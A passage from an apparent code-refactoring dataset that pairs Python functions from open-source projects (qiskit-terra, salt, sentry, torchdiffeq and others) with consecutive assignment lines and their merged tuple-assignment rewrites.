            value = pauli.compose(""Y"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single Z""):
            target = PauliTable.from_labels([""Z"", ""Y"", ""X"", ""I""])
            value = pauli.compose(""Z"")
            self.assertEqual(target, value)","target = PauliTable.from_labels(['I', 'X', 'Y', 'Z'])
value = pauli.compose('I')","target , value  = PauliTable.from_labels(['I', 'X', 'Y', 'Z']), pauli.compose('I')"
qiskit-terra,https://github.com/Qiskit/qiskit-terra/tree/master/test/python/quantum_info/operators/symplectic/test_pauli_table.py,TestPauliTableOperator,test_compose_1q$558,"def test_compose_1q(self):
        """"""Test 1-qubit compose methods.""""""
        # Test single qubit Pauli dot products
        pauli = PauliTable.from_labels([""I"", ""X"", ""Y"", ""Z""])

        with self.subTest(msg=""compose single I""):
            target = PauliTable.from_labels([""I"", ""X"", ""Y"", ""Z""])
            value = pauli.compose(""I"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single X""):
            target = PauliTable.from_labels([""X"", ""I"", ""Z"", ""Y""])
            value = pauli.compose(""X"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single Y""):
            target = PauliTable.from_labels([""Y"", ""Z"", ""I"", ""X""])
            value = pauli.compose(""Y"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single Z""):
            target = PauliTable.from_labels([""Z"", ""Y"", ""X"", ""I""])
            value = pauli.compose(""Z"")
            self.assertEqual(target, value)","target = PauliTable.from_labels(['X', 'I', 'Z', 'Y'])
value = pauli.compose('X')","target , value  = PauliTable.from_labels(['X', 'I', 'Z', 'Y']), pauli.compose('X')"
qiskit-terra,https://github.com/Qiskit/qiskit-terra/tree/master/test/python/quantum_info/operators/symplectic/test_pauli_table.py,TestPauliTableOperator,test_compose_1q$558,"def test_compose_1q(self):
        """"""Test 1-qubit compose methods.""""""
        # Test single qubit Pauli dot products
        pauli = PauliTable.from_labels([""I"", ""X"", ""Y"", ""Z""])

        with self.subTest(msg=""compose single I""):
            target = PauliTable.from_labels([""I"", ""X"", ""Y"", ""Z""])
            value = pauli.compose(""I"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single X""):
            target = PauliTable.from_labels([""X"", ""I"", ""Z"", ""Y""])
            value = pauli.compose(""X"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single Y""):
            target = PauliTable.from_labels([""Y"", ""Z"", ""I"", ""X""])
            value = pauli.compose(""Y"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single Z""):
            target = PauliTable.from_labels([""Z"", ""Y"", ""X"", ""I""])
            value = pauli.compose(""Z"")
            self.assertEqual(target, value)","target = PauliTable.from_labels(['Y', 'Z', 'I', 'X'])
value = pauli.compose('Y')","target , value  = PauliTable.from_labels(['Y', 'Z', 'I', 'X']), pauli.compose('Y')"
qiskit-terra,https://github.com/Qiskit/qiskit-terra/tree/master/test/python/quantum_info/operators/symplectic/test_pauli_table.py,TestPauliTableOperator,test_compose_1q$558,"def test_compose_1q(self):
        """"""Test 1-qubit compose methods.""""""
        # Test single qubit Pauli dot products
        pauli = PauliTable.from_labels([""I"", ""X"", ""Y"", ""Z""])

        with self.subTest(msg=""compose single I""):
            target = PauliTable.from_labels([""I"", ""X"", ""Y"", ""Z""])
            value = pauli.compose(""I"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single X""):
            target = PauliTable.from_labels([""X"", ""I"", ""Z"", ""Y""])
            value = pauli.compose(""X"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single Y""):
            target = PauliTable.from_labels([""Y"", ""Z"", ""I"", ""X""])
            value = pauli.compose(""Y"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single Z""):
            target = PauliTable.from_labels([""Z"", ""Y"", ""X"", ""I""])
            value = pauli.compose(""Z"")
            self.assertEqual(target, value)","target = PauliTable.from_labels(['Z', 'Y', 'X', 'I'])
value = pauli.compose('Z')","target , value  = PauliTable.from_labels(['Z', 'Y', 'X', 'I']), pauli.compose('Z')"
thinc,https://github.com/explosion/thinc/tree/master/thinc/tests/layers/test_combinators.py,,test_map_list$271,"def test_map_list():
    nI = 4
    nO = 9
    Xs = [numpy.zeros((6, nI), dtype=""f""), numpy.ones((3, nI), dtype=""f"")]
    Y_shapes = [(x.shape[0], nO) for x in Xs]
    model = map_list(Linear())
    model.initialize(X=Xs, Y=[numpy.zeros(shape, dtype=""f"") for shape in Y_shapes])
    Ys, backprop = model(Xs, is_train=True)
    assert isinstance(Ys, list)
    assert len(Ys) == len(Xs)
    layer = model.layers[0]
    for X, Y in zip(Xs, Ys):
        assert_allclose(layer.predict(X), Y)
    dXs = backprop(Ys)
    assert isinstance(dXs, list)
    assert len(dXs) == len(Xs)
    assert dXs[0].shape == Xs[0].shape
    assert dXs[1].shape == Xs[1].shape","nO = 9
Xs = [numpy.zeros((6, nI), dtype='f'), numpy.ones((3, nI), dtype='f')]","nO , Xs  = 9, [numpy.zeros((6, nI), dtype='f'), numpy.ones((3, nI), dtype='f')]"
thinc,https://github.com/explosion/thinc/tree/master/thinc/tests/layers/test_combinators.py,,test_map_list$271,"def test_map_list():
    nI = 4
    nO = 9
    Xs = [numpy.zeros((6, nI), dtype=""f""), numpy.ones((3, nI), dtype=""f"")]
    Y_shapes = [(x.shape[0], nO) for x in Xs]
    model = map_list(Linear())
    model.initialize(X=Xs, Y=[numpy.zeros(shape, dtype=""f"") for shape in Y_shapes])
    Ys, backprop = model(Xs, is_train=True)
    assert isinstance(Ys, list)
    assert len(Ys) == len(Xs)
    layer = model.layers[0]
    for X, Y in zip(Xs, Ys):
        assert_allclose(layer.predict(X), Y)
    dXs = backprop(Ys)
    assert isinstance(dXs, list)
    assert len(dXs) == len(Xs)
    assert dXs[0].shape == Xs[0].shape
    assert dXs[1].shape == Xs[1].shape","Y_shapes = [(x.shape[0], nO) for x in Xs]
model = map_list(Linear())","Y_shapes , model  = [(x.shape[0], nO) for x in Xs], map_list(Linear())"
adapter-transformers,https://github.com/Adapter-Hub/adapter-transformers/tree/master/src/transformers/models/longformer/modeling_tf_longformer.py,,_compute_global_attention_mask$393,"def _compute_global_attention_mask(input_ids_shape, sep_token_indices, before_sep_token=True):
    """"""
    Computes global attention mask by putting attention on all tokens before `sep_token_id` if `before_sep_token is
    True` else after `sep_token_id`.
    """"""
    assert shape_list(sep_token_indices)[1] == 2, ""`input_ids` should have two dimensions""
    question_end_index = tf.reshape(sep_token_indices, (input_ids_shape[0], 3, 2))[:, 0, 1][:, None]
    # bool attention mask with True in locations of global attention
    attention_mask = tf.expand_dims(tf.range(input_ids_shape[1], dtype=tf.int64), axis=0)
    attention_mask = tf.tile(attention_mask, (input_ids_shape[0], 1))
    if before_sep_token is True:
        question_end_index = tf.tile(question_end_index, (1, input_ids_shape[1]))
        attention_mask = tf.cast(attention_mask < question_end_index, dtype=question_end_index.dtype)
    else:
        # last token is separation token and should not be counted and in the middle are two separation tokens
        question_end_index = tf.tile(question_end_index + 1, (1, input_ids_shape[1]))
        attention_mask = tf.cast(
            attention_mask > question_end_index,
            dtype=question_end_index.dtype,
        ) * tf.cast(attention_mask < input_ids_shape[-1], dtype=question_end_index.dtype)

    return attention_mask","question_end_index = tf.reshape(sep_token_indices, (input_ids_shape[0], 3, 2))[:, 0, 1][:, None]
attention_mask = tf.expand_dims(tf.range(input_ids_shape[1], dtype=tf.int64), axis=0)","question_end_index , attention_mask  = tf.reshape(sep_token_indices, (input_ids_shape[0], 3, 2))[:, 0, 1][:, None], tf.expand_dims(tf.range(input_ids_shape[1], dtype=tf.int64), axis=0)"
salt,https://github.com/saltstack/salt/tree/master/tests/unit/modules/test_file.py,FilemodLineTests,test_if_not_location_or_before_but_after_then_line_should_be_inserted_after_after$1883,"def test_if_not_location_or_before_but_after_then_line_should_be_inserted_after_after(
        self,
    ):
        location = before = None
        after = ""indessed""
        content = ""roscivs""
        indent = ""\t\t\t   ""
        original_lines = [""foo"", indent + after, ""bar""]
        expected_lines = [""foo"", indent + after, indent + content, ""bar""]

        actual_lines = filemod._set_line(
            lines=original_lines,
            content=content,
            mode=""insert"",
            location=location,
            before=before,
            after=after,
        )

        self.assertEqual(actual_lines, expected_lines)","after = 'indessed'
content = 'roscivs'
indent = '\t\t\t   '","after , content , indent  = 'indessed', 'roscivs', '\t\t\t   '"
salt,https://github.com/saltstack/salt/tree/master/tests/unit/modules/test_file.py,FilemodLineTests,test_if_not_location_or_before_but_after_then_line_should_be_inserted_after_after$1883,"def test_if_not_location_or_before_but_after_then_line_should_be_inserted_after_after(
        self,
    ):
        location = before = None
        after = ""indessed""
        content = ""roscivs""
        indent = ""\t\t\t   ""
        original_lines = [""foo"", indent + after, ""bar""]
        expected_lines = [""foo"", indent + after, indent + content, ""bar""]

        actual_lines = filemod._set_line(
            lines=original_lines,
            content=content,
            mode=""insert"",
            location=location,
            before=before,
            after=after,
        )

        self.assertEqual(actual_lines, expected_lines)","expected_lines = ['foo', indent + after, indent + content, 'bar']
actual_lines = filemod._set_line(lines=original_lines, content=content, mode='insert', location=location, before=before, after=after)","expected_lines , actual_lines  = ['foo', indent + after, indent + content, 'bar'], filemod._set_line(lines=original_lines, content=content, mode='insert', location=location, before=before, after=after)"
sloth,https://github.com/cvhciKIT/sloth/tree/master/sloth/gui/annotationscene.py,AnnotationScene,__init__$14,"def __init__(self, labeltool, items=None, inserters=None, parent=None):
        super(AnnotationScene, self).__init__(parent)

        self._model = None
        self._image_item = None
        self._inserter = None
        self._scene_item = None
        self._message = """"
        self._labeltool = labeltool

        self._itemfactory = Factory(items)
        self._inserterfactory = Factory(inserters)

        try:
            self.setBackgroundBrush(config.SCENE_BACKGROUND)
        except:
            self.setBackgroundBrush(Qt.darkGray)
        self.reset()","self._model = None
self._image_item = None
self._inserter = None
self._scene_item = None
self._message = ''
self._labeltool = labeltool
self._itemfactory = Factory(items)
self._inserterfactory = Factory(inserters)","self._model , self._image_item , self._inserter , self._scene_item , self._message , self._labeltool , self._itemfactory , self._inserterfactory  = None, None, None, None, '', labeltool, Factory(items), Factory(inserters)"
holoviews,https://github.com/holoviz/holoviews/tree/master/holoviews/tests/core/data/base.py,HeterogeneousColumnTests,test_dataset_groupby_alias$621,"def test_dataset_groupby_alias(self):
        group1 = {'age':[10,16], 'weight':[15,18], 'height':[0.8,0.6]}
        group2 = {'age':[12], 'weight':[10], 'height':[0.8]}
        grouped = HoloMap([('M', Dataset(group1, kdims=[('age', 'Age')],
                                         vdims=self.alias_vdims)),
                           ('F', Dataset(group2, kdims=[('age', 'Age')],
                                         vdims=self.alias_vdims))],
                          kdims=[('gender', 'Gender')], sort=False)
        self.assertEqual(self.alias_table.groupby('Gender'), grouped)","group1 = {'age': [10, 16], 'weight': [15, 18], 'height': [0.8, 0.6]}
group2 = {'age': [12], 'weight': [10], 'height': [0.8]}","group1 , group2  = {'age': [10, 16], 'weight': [15, 18], 'height': [0.8, 0.6]}, {'age': [12], 'weight': [10], 'height': [0.8]}"
GaitSet,https://github.com/AbnerHqC/GaitSet/tree/master/model/utils/sampler.py,TripletSampler,__init__$6,"def __init__(self, dataset, batch_size):
        self.dataset = dataset
        self.batch_size = batch_size","self.dataset = dataset
self.batch_size = batch_size","self.dataset , self.batch_size  = dataset, batch_size"
mlrun,https://github.com/mlrun/mlrun/tree/master/mlrun/db/httpdb.py,HTTPRunDB,get_pipeline$1478,"def get_pipeline(
        self,
        run_id: str,
        namespace: str = None,
        timeout: int = 10,
        format_: Union[
            str, mlrun.api.schemas.PipelinesFormat
        ] = mlrun.api.schemas.PipelinesFormat.summary,
        project: str = None,
    ):
        """"""Retrieve details of a specific pipeline using its run ID (as provided when the pipeline was executed).""""""

        try:
            params = {}
            if namespace:
                params[""namespace""] = namespace
            params[""format""] = format_
            project_path = project if project else ""*""
            resp = self.api_call(
                ""GET"",
                f""projects/{project_path}/pipelines/{run_id}"",
                params=params,
                timeout=timeout,
            )
        except OSError as err:
            logger.error(f""error cannot get pipeline: {err}"")
            raise OSError(f""error: cannot get pipeline, {err}"")

        if not resp.ok:
            logger.error(f""bad resp!!\n{resp.text}"")
            raise ValueError(f""bad get pipeline response, {resp.text}"")

        return resp.json()","params['format'] = format_
project_path = project if project else '*'","params['format'] , project_path  = format_, project if project else '*'"
dynaconf,https://github.com/rochacbruno/dynaconf/tree/master/dynaconf/vendor_src/click/_unicodefun.py,,_verify_python_env$5,"def _verify_python_env():
    """"""Ensures that the environment is good for Unicode.""""""
    try:
        import locale

        fs_enc = codecs.lookup(locale.getpreferredencoding()).name
    except Exception:
        fs_enc = ""ascii""
    if fs_enc != ""ascii"":
        return

    extra = """"
    if os.name == ""posix"":
        import subprocess

        try:
            rv = subprocess.Popen(
                [""locale"", ""-a""], stdout=subprocess.PIPE, stderr=subprocess.PIPE
            ).communicate()[0]
        except OSError:
            rv = b""""
        good_locales = set()
        has_c_utf8 = False

        # Make sure we're operating on text here.
        if isinstance(rv, bytes):
            rv = rv.decode(""ascii"", ""replace"")

        for line in rv.splitlines():
            locale = line.strip()
            if locale.lower().endswith(("".utf-8"", "".utf8"")):
                good_locales.add(locale)
                if locale.lower() in (""c.utf8"", ""c.utf-8""):
                    has_c_utf8 = True

        extra += ""\n\n""
        if not good_locales:
            extra += (
                ""Additional information: on this system no suitable""
                "" UTF-8 locales were discovered. This most likely""
                "" requires resolving by reconfiguring the locale""
                "" system.""
            )
        elif has_c_utf8:
            extra += (
                ""This system supports the C.UTF-8 locale which is""
                "" recommended. You might be able to resolve your issue""
                "" by exporting the following environment variables:\n\n""
                ""    export LC_ALL=C.UTF-8\n""
                ""    export LANG=C.UTF-8""
            )
        else:
            extra += (
                ""This system lists some UTF-8 supporting locales that""
                "" you can pick from. The following suitable locales""
                f"" were discovered: {', '.join(sorted(good_locales))}""
            )

        bad_locale = None
        for locale in os.environ.get(""LC_ALL""), os.environ.get(""LANG""):
            if locale and locale.lower().endswith(("".utf-8"", "".utf8"")):
                bad_locale = locale
            if locale is not None:
                break
        if bad_locale is not None:
            extra += (
                ""\n\nClick discovered that you exported a UTF-8 locale""
                "" but the locale system could not pick up from it""
                "" because it does not exist. The exported locale is""
                f"" {bad_locale!r} but it is not supported""
            )

    raise RuntimeError(
        ""Click will abort further execution because Python was""
        "" configured to use ASCII as encoding for the environment.""
        "" Consult https://click.palletsprojects.com/unicode-support/""
        f"" for mitigation steps.{extra}""
    )","good_locales = set()
has_c_utf8 = False","good_locales , has_c_utf8  = set(), False"
super-resolution,https://github.com/icpm/super-resolution/tree/master/VDSR/solver.py,VDSRTrainer,img_preprocess$44,"def img_preprocess(self, data, interpolation='bicubic'):
        if interpolation == 'bicubic':
            interpolation = Image.BICUBIC
        elif interpolation == 'bilinear':
            interpolation = Image.BILINEAR
        elif interpolation == 'nearest':
            interpolation = Image.NEAREST

        size = list(data.shape)

        if len(size) == 4:
            target_height = int(size[2] * self.upscale_factor)
            target_width = int(size[3] * self.upscale_factor)
            out_data = torch.FloatTensor(size[0], size[1], target_height, target_width)
            for i, img in enumerate(data):
                transform = transforms.Compose([transforms.ToPILImage(),
                                                transforms.Resize((target_width, target_height), interpolation=interpolation),
                                                transforms.ToTensor()])

                out_data[i, :, :, :] = transform(img)
            return out_data
        else:
            target_height = int(size[1] * self.upscale_factor)
            target_width = int(size[2] * self.upscale_factor)
            transform = transforms.Compose([transforms.ToPILImage(),
                                            transforms.Resize((target_width, target_height), interpolation=interpolation),
                                            transforms.ToTensor()])
            return transform(data)","target_height = int(size[2] * self.upscale_factor)
target_width = int(size[3] * self.upscale_factor)","target_height , target_width  = int(size[2] * self.upscale_factor), int(size[3] * self.upscale_factor)"
salt,https://github.com/saltstack/salt/tree/master/salt/modules/macpackage.py,,_get_pkg_id_dir$296,"def _get_pkg_id_dir(path):
    path = _quote(os.path.join(path, ""Contents/Info.plist""))
    cmd = '/usr/libexec/PlistBuddy -c ""print :CFBundleIdentifier"" {}'.format(path)

    # We can only use wildcards in python_shell which is
    # sent by the macpackage state
    python_shell = False
    if ""*."" in cmd:
        python_shell = True

    out = __salt__[""cmd.run""](cmd, python_shell=python_shell)

    if ""Does Not Exist"" not in out:
        return [out]

    return []","cmd = '/usr/libexec/PlistBuddy -c ""print :CFBundleIdentifier"" {}'.format(path)
python_shell = False","cmd , python_shell  = '/usr/libexec/PlistBuddy -c ""print :CFBundleIdentifier"" {}'.format(path), False"
cogdl,https://github.com/THUDM/cogdl/tree/master/cogdl/layers/mlp_layer.py,MLP,__init__$25,"def __init__(
        self,
        in_feats,
        out_feats,
        hidden_size,
        num_layers,
        dropout=0.0,
        activation=""relu"",
        norm=None,
        act_first=False,
        bias=True,
    ):
        super(MLP, self).__init__()
        self.norm = norm
        self.activation = get_activation(activation)
        self.act_first = act_first
        self.dropout = dropout
        shapes = [in_feats] + [hidden_size] * (num_layers - 1) + [out_feats]
        self.mlp = nn.ModuleList(
            [nn.Linear(shapes[layer], shapes[layer + 1], bias=bias) for layer in range(num_layers)]
        )
        if norm is not None and num_layers > 1:
            if norm == ""layernorm"":
                self.norm_list = nn.ModuleList(nn.LayerNorm(x) for x in shapes[1:-1])
            elif norm == ""batchnorm"":
                self.norm_list = nn.ModuleList(nn.BatchNorm1d(x) for x in shapes[1:-1])
            else:
                raise NotImplementedError(f""{norm} is not implemented in CogDL."")
        self.reset_parameters()","self.norm = norm
self.activation = get_activation(activation)
self.act_first = act_first
self.dropout = dropout
shapes = [in_feats] + [hidden_size] * (num_layers - 1) + [out_feats]","self.norm , self.activation , self.act_first , self.dropout , shapes  = norm, get_activation(activation), act_first, dropout, [in_feats] + [hidden_size] * (num_layers - 1) + [out_feats]"
OpenFermion,https://github.com/quantumlib/OpenFermion/tree/master/src/openfermion/ops/operators/majorana_operator_test.py,,test_majorana_operator_eq$178,"def test_majorana_operator_eq():
    a = MajoranaOperator((0, 1, 5), 1.5) + MajoranaOperator((1, 2, 7), -0.5)
    b = (MajoranaOperator((0, 1, 5), 1.5) + MajoranaOperator(
        (1, 2, 7), -0.5) + MajoranaOperator((3, 4, 5), 0.0))
    c = (MajoranaOperator((0, 1, 5), 1.5) + MajoranaOperator(
        (1, 2, 7), -0.5) + MajoranaOperator((3, 4, 5), 0.1))
    d = MajoranaOperator((0, 1, 5), 1.75) + MajoranaOperator((1, 2, 7), -0.75)
    e = MajoranaOperator((0, 1, 5), 1.5) - MajoranaOperator((0, 3, 6), 0.25)

    assert a == b
    assert a != c
    assert a != d
    assert a != e

    assert a != 0","a = MajoranaOperator((0, 1, 5), 1.5) + MajoranaOperator((1, 2, 7), -0.5)
b = MajoranaOperator((0, 1, 5), 1.5) + MajoranaOperator((1, 2, 7), -0.5) + MajoranaOperator((3, 4, 5), 0.0)
c = MajoranaOperator((0, 1, 5), 1.5) + MajoranaOperator((1, 2, 7), -0.5) + MajoranaOperator((3, 4, 5), 0.1)
d = MajoranaOperator((0, 1, 5), 1.75) + MajoranaOperator((1, 2, 7), -0.75)
e = MajoranaOperator((0, 1, 5), 1.5) - MajoranaOperator((0, 3, 6), 0.25)","a , b , c , d , e  = MajoranaOperator((0, 1, 5), 1.5) + MajoranaOperator((1, 2, 7), -0.5), MajoranaOperator((0, 1, 5), 1.5) + MajoranaOperator((1, 2, 7), -0.5) + MajoranaOperator((3, 4, 5), 0.0), MajoranaOperator((0, 1, 5), 1.5) + MajoranaOperator((1, 2, 7), -0.5) + MajoranaOperator((3, 4, 5), 0.1), MajoranaOperator((0, 1, 5), 1.75) + MajoranaOperator((1, 2, 7), -0.75), MajoranaOperator((0, 1, 5), 1.5) - MajoranaOperator((0, 3, 6), 0.25)"
awesome-semantic-segmentation-pytorch,https://github.com/Tramac/awesome-semantic-segmentation-pytorch/tree/master/core/utils/parallel.py,Reduce,forward$14,"def forward(ctx, *inputs):
        ctx.target_gpus = [inputs[i].get_device() for i in range(len(inputs))]
        inputs = sorted(inputs, key=lambda i: i.get_device())
        return comm.reduce_add(inputs)","ctx.target_gpus = [inputs[i].get_device() for i in range(len(inputs))]
inputs = sorted(inputs, key=lambda i: i.get_device())","ctx.target_gpus , inputs  = [inputs[i].get_device() for i in range(len(inputs))], sorted(inputs, key=lambda i: i.get_device())"
torchdiffeq,https://github.com/rtqichen/torchdiffeq/tree/master/torchdiffeq/_impl/solvers.py,FixedGridODESolver,integrate_until_event$130,"def integrate_until_event(self, t0, event_fn):
        assert self.step_size is not None, ""Event handling for fixed step solvers currently requires `step_size` to be provided in options.""

        t0 = t0.type_as(self.y0)
        y0 = self.y0
        dt = self.step_size

        sign0 = torch.sign(event_fn(t0, y0))
        max_itrs = 20000
        itr = 0
        while True:
            itr += 1
            t1 = t0 + dt
            dy, f0 = self._step_func(self.func, t0, dt, t1, y0)
            y1 = y0 + dy

            sign1 = torch.sign(event_fn(t1, y1))

            if sign0 != sign1:
                if self.interp == ""linear"":
                    interp_fn = lambda t: self._linear_interp(t0, t1, y0, y1, t)
                elif self.interp == ""cubic"":
                    f1 = self.func(t1, y1)
                    interp_fn = lambda t: self._cubic_hermite_interp(t0, y0, f0, t1, y1, f1, t)
                else:
                    raise ValueError(f""Unknown interpolation method {self.interp}"")
                event_time, y1 = find_event(interp_fn, sign0, t0, t1, event_fn, float(self.atol))
                break
            else:
                t0, y0 = t1, y1

            if itr >= max_itrs:
                raise RuntimeError(f""Reached maximum number of iterations {max_itrs}."")
        solution = torch.stack([self.y0, y1], dim=0)
        return event_time, solution","t0 = t0.type_as(self.y0)
y0 = self.y0","t0 , y0  = t0.type_as(self.y0), self.y0"
torchdiffeq,https://github.com/rtqichen/torchdiffeq/tree/master/torchdiffeq/_impl/solvers.py,FixedGridODESolver,integrate_until_event$130,"def integrate_until_event(self, t0, event_fn):
        assert self.step_size is not None, ""Event handling for fixed step solvers currently requires `step_size` to be provided in options.""

        t0 = t0.type_as(self.y0)
        y0 = self.y0
        dt = self.step_size

        sign0 = torch.sign(event_fn(t0, y0))
        max_itrs = 20000
        itr = 0
        while True:
            itr += 1
            t1 = t0 + dt
            dy, f0 = self._step_func(self.func, t0, dt, t1, y0)
            y1 = y0 + dy

            sign1 = torch.sign(event_fn(t1, y1))

            if sign0 != sign1:
                if self.interp == ""linear"":
                    interp_fn = lambda t: self._linear_interp(t0, t1, y0, y1, t)
                elif self.interp == ""cubic"":
                    f1 = self.func(t1, y1)
                    interp_fn = lambda t: self._cubic_hermite_interp(t0, y0, f0, t1, y1, f1, t)
                else:
                    raise ValueError(f""Unknown interpolation method {self.interp}"")
                event_time, y1 = find_event(interp_fn, sign0, t0, t1, event_fn, float(self.atol))
                break
            else:
                t0, y0 = t1, y1

            if itr >= max_itrs:
                raise RuntimeError(f""Reached maximum number of iterations {max_itrs}."")
        solution = torch.stack([self.y0, y1], dim=0)
        return event_time, solution","dt = self.step_size
sign0 = torch.sign(event_fn(t0, y0))
max_itrs = 20000
itr = 0","dt , sign0 , max_itrs , itr  = self.step_size, torch.sign(event_fn(t0, y0)), 20000, 0"
sentry,https://github.com/getsentry/sentry/tree/master/src/sentry/runner/commands/backup.py,,sort_dependencies$34,"def sort_dependencies():
    """"""
    Similar to Django's except that we discard the important of natural keys
    when sorting dependencies (i.e. it works without them).
    """"""
    from django.apps import apps

    # Process the list of models, and get the list of dependencies
    model_dependencies = []
    models = set()
    for app_config in apps.get_app_configs():
        if app_config.label in EXCLUDED_APPS:
            continue

        model_list = app_config.get_models()

        for model in model_list:
            models.add(model)
            # Add any explicitly defined dependencies
            if hasattr(model, ""natural_key""):
                deps = getattr(model.natural_key, ""dependencies"", [])
                if deps:
                    deps = [apps.get_model(*d.split(""."")) for d in deps]
            else:
                deps = []

            # Now add a dependency for any FK relation with a model that
            # defines a natural key
            for field in model._meta.fields:
                if hasattr(field.remote_field, ""model""):
                    rel_model = field.remote_field.model
                    if rel_model != model:
                        deps.append(rel_model)

            # Also add a dependency for any simple M2M relation with a model
            # that defines a natural key.  M2M relations with explicit through
            # models don't count as dependencies.
            for field in model._meta.many_to_many:
                rel_model = field.remote_field.model
                if rel_model != model:
                    deps.append(rel_model)
            model_dependencies.append((model, deps))

    model_dependencies.reverse()
    # Now sort the models to ensure that dependencies are met. This
    # is done by repeatedly iterating over the input list of models.
    # If all the dependencies of a given model are in the final list,
    # that model is promoted to the end of the final list. This process
    # continues until the input list is empty, or we do a full iteration
    # over the input models without promoting a model to the final list.
    # If we do a full iteration without a promotion, that means there are
    # circular dependencies in the list.
    model_list = []
    while model_dependencies:
        skipped = []
        changed = False
        while model_dependencies:
            model, deps = model_dependencies.pop()

            # If all of the models in the dependency list are either already
            # on the final model list, or not on the original serialization list,
            # then we've found another model with all it's dependencies satisfied.
            found = True
            for candidate in ((d not in models or d in model_list) for d in deps):
                if not candidate:
                    found = False
            if found:
                model_list.append(model)
                changed = True
            else:
                skipped.append((model, deps))
        if not changed:
            raise RuntimeError(
                ""Can't resolve dependencies for %s in serialized app list.""
                % "", "".join(
                    f""{model._meta.app_label}.{model._meta.object_name}""
                    for model, deps in sorted(skipped, key=lambda obj: obj[0].__name__)
                )
            )
        model_dependencies = skipped

    return model_list","model_dependencies = []
models = set()","model_dependencies , models  = [], set()"
sentry,https://github.com/getsentry/sentry/tree/master/src/sentry/runner/commands/backup.py,,sort_dependencies$34,"def sort_dependencies():
    """"""
    Similar to Django's except that we discard the important of natural keys
    when sorting dependencies (i.e. it works without them).
    """"""
    from django.apps import apps

    # Process the list of models, and get the list of dependencies
    model_dependencies = []
    models = set()
    for app_config in apps.get_app_configs():
        if app_config.label in EXCLUDED_APPS:
            continue

        model_list = app_config.get_models()

        for model in model_list:
            models.add(model)
            # Add any explicitly defined dependencies
            if hasattr(model, ""natural_key""):
                deps = getattr(model.natural_key, ""dependencies"", [])
                if deps:
                    deps = [apps.get_model(*d.split(""."")) for d in deps]
            else:
                deps = []

            # Now add a dependency for any FK relation with a model that
            # defines a natural key
            for field in model._meta.fields:
                if hasattr(field.remote_field, ""model""):
                    rel_model = field.remote_field.model
                    if rel_model != model:
                        deps.append(rel_model)

            # Also add a dependency for any simple M2M relation with a model
            # that defines a natural key.  M2M relations with explicit through
            # models don't count as dependencies.
            for field in model._meta.many_to_many:
                rel_model = field.remote_field.model
                if rel_model != model:
                    deps.append(rel_model)
            model_dependencies.append((model, deps))

    model_dependencies.reverse()
    # Now sort the models to ensure that dependencies are met. This
    # is done by repeatedly iterating over the input list of models.
    # If all the dependencies of a given model are in the final list,
    # that model is promoted to the end of the final list. This process
    # continues until the input list is empty, or we do a full iteration
    # over the input models without promoting a model to the final list.
    # If we do a full iteration without a promotion, that means there are
    # circular dependencies in the list.
    model_list = []
    while model_dependencies:
        skipped = []
        changed = False
        while model_dependencies:
            model, deps = model_dependencies.pop()

            # If all of the models in the dependency list are either already
            # on the final model list, or not on the original serialization list,
            # then we've found another model with all it's dependencies satisfied.
            found = True
            for candidate in ((d not in models or d in model_list) for d in deps):
                if not candidate:
                    found = False
            if found:
                model_list.append(model)
                changed = True
            else:
                skipped.append((model, deps))
        if not changed:
            raise RuntimeError(
                ""Can't resolve dependencies for %s in serialized app list.""
                % "", "".join(
                    f""{model._meta.app_label}.{model._meta.object_name}""
                    for model, deps in sorted(skipped, key=lambda obj: obj[0].__name__)
                )
            )
        model_dependencies = skipped

    return model_list","skipped = []
changed = False","skipped , changed  = [], False"
QUANTAXIS,https://github.com/QUANTAXIS/QUANTAXIS/tree/master/QUANTAXIS/QAMarket/QAOrder.py,QA_Order,from_dict$649,"def from_dict(self, order_dict):
        '''
        从字段类型的字段 填充 对象的字段
        :param order_dict:  dict 类型
        :return: self QA_Order
        '''
        try:
            # QA_util_log_info('QA_ORDER CHANGE: from {} change to {}'.format(
            #     self.order_id, order['order_id']))
            self.price = order_dict['price']
            self.date = order_dict['date']
            self.datetime = order_dict['datetime']
            self.sending_time = order_dict['sending_time']  # 下单时间
            self.trade_time = order_dict['trade_time']
            self.amount = order_dict['amount']
            self.frequence = order_dict['frequence']
            self.market_type = order_dict['market_type']
            self.towards = order_dict['towards']
            self.code = order_dict['code']
            self.user_cookie = order_dict['user_cookie']
            self.account_cookie = order_dict['account_cookie']
            self.strategy = order_dict['strategy']
            self.type = order_dict['type']
            self.order_model = order_dict['order_model']
            self.amount_model = order_dict['amount_model']
            self.order_id = order_dict['order_id']
            self.realorder_id = order_dict['realorder_id']
            self.trade_id = order_dict['trade_id']
            self.callback = order_dict['callback']
            self.commission_coeff = order_dict['commission_coeff']
            self.tax_coeff = order_dict['tax_coeff']

            self.money = order_dict['money']
            self._status = order_dict['_status']

            self.cancel_amount = order_dict['cancel_amount']
            self.trade_amount = order_dict['trade_amount']
            self.trade_price = order_dict['trade_price']
            self.reason = order_dict['reason']

            return self
        except Exception as e:
            QA_util_log_info('Failed to tran from dict {}'.format(e))","self.price = order_dict['price']
self.date = order_dict['date']
self.datetime = order_dict['datetime']
self.sending_time = order_dict['sending_time']
self.trade_time = order_dict['trade_time']
self.amount = order_dict['amount']
self.frequence = order_dict['frequence']
self.market_type = order_dict['market_type']
self.towards = order_dict['towards']
self.code = order_dict['code']
self.user_cookie = order_dict['user_cookie']
self.account_cookie = order_dict['account_cookie']
self.strategy = order_dict['strategy']
self.type = order_dict['type']
self.order_model = order_dict['order_model']
self.amount_model = order_dict['amount_model']
self.order_id = order_dict['order_id']
self.realorder_id = order_dict['realorder_id']
self.trade_id = order_dict['trade_id']
self.callback = order_dict['callback']
self.commission_coeff = order_dict['commission_coeff']
self.tax_coeff = order_dict['tax_coeff']
self.money = order_dict['money']
self._status = order_dict['_status']
self.cancel_amount = order_dict['cancel_amount']
self.trade_amount = order_dict['trade_amount']
self.trade_price = order_dict['trade_price']
